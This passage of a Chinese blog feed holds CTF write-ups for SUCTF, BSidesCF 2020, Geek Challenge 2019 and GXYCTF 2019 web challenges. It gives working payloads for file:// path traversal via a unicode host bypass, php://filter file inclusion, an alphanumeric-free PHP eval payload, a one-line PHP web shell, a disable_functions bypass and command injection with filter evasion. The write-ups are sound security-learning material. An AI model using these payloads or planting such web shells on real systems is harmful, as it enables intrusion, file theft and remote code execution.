&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;三个if都是判断&lt;code&gt;host == 'suctf.cc'&lt;/code&gt;，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断&lt;code&gt;==&lt;/code&gt;，回过头来注意到了&lt;strong&gt;第二个&lt;/strong&gt;if中有&lt;code&gt;newhost.append(h.encode('idna').decode('utf-8'))&lt;/code&gt;进行了一波编码，那么问题就出在了这里。&lt;/p&gt;
&lt;p&gt;所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母&lt;code&gt;c&lt;/code&gt;，那么我就找第一个字母&lt;code&gt;s&lt;/code&gt;验证一下，贴一个unicode的网站：https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，&lt;strong&gt;需要多试几个&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310102326.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;我选出的是这个字符&lt;code&gt;𝐬&lt;/code&gt;，我们先使用url编码一下防止参数出现错误，尝试读一下passwd：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310102513.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;flag并不在其中，并且也不再根目录下，根据题目中有&lt;code&gt;nginx&lt;/code&gt;应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf&lt;/p&gt;
&lt;p&gt;主配置文件：/etc/nginx/conf/nginx.conf&lt;/p&gt;
&lt;p&gt;管理脚本：/usr/lib64/systemd/system/nginx.service&lt;/p&gt;
&lt;p&gt;模块：/usr/lisb64/nginx/modules&lt;/p&gt;
&lt;p&gt;应用程序：/usr/sbin/nginx&lt;/p&gt;
&lt;p&gt;程序默认存放位置：/usr/share/nginx/html&lt;/p&gt;
&lt;p&gt;日志默认存放位置：/var/log/nginx&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;读配置文件&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103257.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;读flag&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310103323.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;参考的博客链接：&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.xmsec.cc/suctf19-wp/" target="_blank" rel="noopener"
&gt;https://www.xmsec.cc/suctf19-wp/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://xz.aliyun.com/t/6042#toc-24" target="_blank" rel="noopener"
&gt;https://xz.aliyun.com/t/6042#toc-24&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener"
&gt;https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bsidescf-2020had-a-bad-day"&gt;[BSidesCF 2020]Had a bad day
&lt;/h1&gt;&lt;p&gt;看这个标题我推一下OWRLD ORDER的&lt;a class="link" href="https://www.bilibili.com/video/BV1Bb411K7Gd" target="_blank" rel="noopener"
&gt;Have a nice day&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;/index.php?category=woofers
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;尝试输入flag会显示&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310175019.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;只能有&lt;code&gt;woofers&lt;/code&gt;和&lt;code&gt;meowers&lt;/code&gt;可以通过，尝试了下php的&lt;code&gt;filter&lt;/code&gt;伪协议读文件&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310175611.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;center&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &amp;lt;&lt;span style="color:#f92672"&gt;h4&lt;/span&gt;&amp;gt; Woof! Woof! &amp;lt;/&lt;span style="color:#f92672"&gt;h4&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;/&lt;span style="color:#f92672"&gt;center&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;img&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;style&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;width:100%&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;img/dog/&amp;lt;?php echo rand(1,10)?&amp;gt;.jpg&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;多尝试以后发现可以读&lt;code&gt;index&lt;/code&gt;，下面是主要的源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;category&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($file)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;( &lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;( $file, &lt;span style="color:#e6db74"&gt;&amp;#34;woofers&amp;#34;&lt;/span&gt; ) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;( $file, &lt;span style="color:#e6db74"&gt;&amp;#34;meowers&amp;#34;&lt;/span&gt; ) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;( $file, &lt;span style="color:#e6db74"&gt;&amp;#34;index&amp;#34;&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;include&lt;/span&gt; ($file &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Sorry, we currently only support woofers and meowers.&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到if判断中需要字符串包含&lt;code&gt;woofers&lt;/code&gt;、&lt;code&gt;meowers&lt;/code&gt;、&lt;code&gt;index&lt;/code&gt;，那么我们只需要在filter伪协议中插入字符串绕过判断即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;需要知道的&lt;/strong&gt;：filter可以设定一个或多个过滤器名称，以管道符&lt;code&gt;\&lt;/code&gt;分隔，所以构造payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;读出来以后解密即可获得flag&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310181106.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;搜索的时候学到了一个其他的截断&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;zip://test.zip#hello.html.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。&lt;/p&gt;</description></item><item><title>极客大挑战 2019 RCE ME</title><link>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link><pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid><description>&lt;h1 id="极客大挑战-2019rce-me"&gt;[极客大挑战 2019]RCE ME
&lt;/h1&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
if(isset($_GET[&amp;#39;code&amp;#39;])){
$code=$_GET[&amp;#39;code&amp;#39;];
if(strlen($code)&amp;gt;40){
die(&amp;#34;This is too Long.&amp;#34;);
}
if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
die(&amp;#34;NO.&amp;#34;);
}
@eval($code);
}
else{
highlight_file(__FILE__);
}
// ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分析一波，GET请求获得&lt;code&gt;code&lt;/code&gt;，想要通过的话需要绕过两个检测：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;payload长度小于40&lt;/li&gt;
&lt;li&gt;不能包含&lt;code&gt;a-z、A-Z、0-9&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener"
&gt;一些不包含数字和字母的webshell&lt;/a&gt;，这次摸到了相关文章：&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener"
&gt;无字母数字webshell之提高篇&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;url编码&lt;/code&gt;+&lt;code&gt;~&lt;/code&gt;取反构造不可见字符串，然后加上php7版本以后支持了使用：&lt;code&gt;($a)()&lt;/code&gt;这样的方法动态执行函数，所以我们可以构造payload：&lt;code&gt;assert(eval($_POST[‘a’]))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;先构造&lt;code&gt;assert&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;echo urlencode(~&amp;#39;assert&amp;#39;);
//结果：%9E%8C%8C%9A%8D%8B
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再构造&lt;code&gt;eval($_POST['a'])&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);
//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完整payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的&lt;code&gt;~&lt;/code&gt;取反再获得真正的函数名。&lt;/p&gt;
&lt;p&gt;使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是&lt;code&gt;ELF&lt;/code&gt;是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回&lt;code&gt;ret=127&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;搜索了一波，原来是是&lt;strong&gt;disable_function&lt;/strong&gt;搞的鬼，这个表可以在phpinfo()中查看：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;因为&lt;code&gt;system&lt;/code&gt;、&lt;code&gt;exec&lt;/code&gt;、&lt;code&gt;shell_exec&lt;/code&gt;等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过&lt;strong&gt;disable_function&lt;/strong&gt;的方法，网上有很多其他方法，其中一个方法：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用环境变量LD_PRELOAD来绕过&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&lt;/p&gt;
&lt;p&gt;LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;正好蚁剑的插件中就有一个名为：&lt;a class="link" href="https://github.com/Medicean/as_bypass_php_disable_functions" target="_blank" rel="noopener"
&gt;as_bypass_php_disable_functions&lt;/a&gt;的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的&lt;code&gt;/var/www/html&lt;/code&gt;目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;上传一句话木马233.php：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
@eval($_POST[&amp;#39;b&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再用一句话木马的shell执行插件：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;进入shell，目录下面多了一个名为**.antproxy.php**的文件：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p&gt;</description></item><item><title>GXYCTF2019 Ping Ping Ping</title><link>https://www.braindance.top/posts/ctf/gxyctf2019ping-ping-ping/</link><pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/gxyctf2019ping-ping-ping/</guid><description>&lt;h1 id="gxyctf2019ping-ping-ping"&gt;[GXYCTF2019]Ping Ping Ping
&lt;/h1&gt;&lt;p&gt;题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&lt;/p&gt;
&lt;p&gt;和DMCTF做的那道&lt;strong&gt;pingpingping&lt;/strong&gt;类似，同样是使用管道符构造payload，先使用：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?ip=127.0.0.1|ls
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目录下有两个文件：&lt;code&gt;flag.php&lt;/code&gt;、&lt;code&gt;index.php&lt;/code&gt;。首先试出来了空格被过滤，使用以下绕过空格：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
&amp;lt;
&amp;lt;&amp;gt;
{cat,flag.php} //用逗号实现了空格功能
%20
%09
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在linux下反单引号里面的指令会被执行 &lt;strong&gt;`ls`&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?ip=|cat$IFS`ls`
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;会输出该目录下所有可以打开的文件，可以查看&lt;strong&gt;index.php&lt;/strong&gt;的部分源码有哪些过滤：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;/?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;ip&lt;/span&gt;&lt;span style="color:#f92672"&gt;=|&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;\&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;|&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;|&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span&gt;, $ip, $match)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;|&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span&gt;, $ip, $match);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your symbol!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/ /&amp;#34;&lt;/span&gt;, $ip)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your space!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/bash/&amp;#34;&lt;/span&gt;, $ip)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your bash!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;&lt;/span&gt;, $ip)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your flag!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $a &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;shell_exec&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;ping -c 4 &amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$ip);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;print_r&lt;/span&gt;($a);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问&lt;strong&gt;flag.php&lt;/strong&gt;。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用&lt;strong&gt;readflag&lt;/strong&gt;的ELF执行文件访问，但是还没成功。其实执行：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?ip=|cat$IFS`ls`
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了&lt;del&gt;我是傻逼&lt;/del&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后记录下学到的姿势和这道题目的其他思路&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;管道符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;|&lt;/code&gt;直接执行后面的语句。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;||&lt;/code&gt;如果前面语句错误，执行后面的语句。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;前面和后面命令都要执行，无论前面真假，&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用以下绕过空格：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$IFS
${IFS}
${IFS}$1
$IFS$1 //$1改成$加其他数字貌似都行
&amp;lt;
&amp;lt;&amp;gt;
{cat,flag.php} //用逗号实现了空格功能
%20
%09 //需要php环境
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;覆盖源码里的&lt;code&gt;$a&lt;/code&gt;变量（拼接变量）：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;使用sh执行脚本：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;内联执行：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?ip=|cat$IFS`ls`
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;附：大佬整理的博客（内含更多姿势）：&lt;a class="link" href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener"
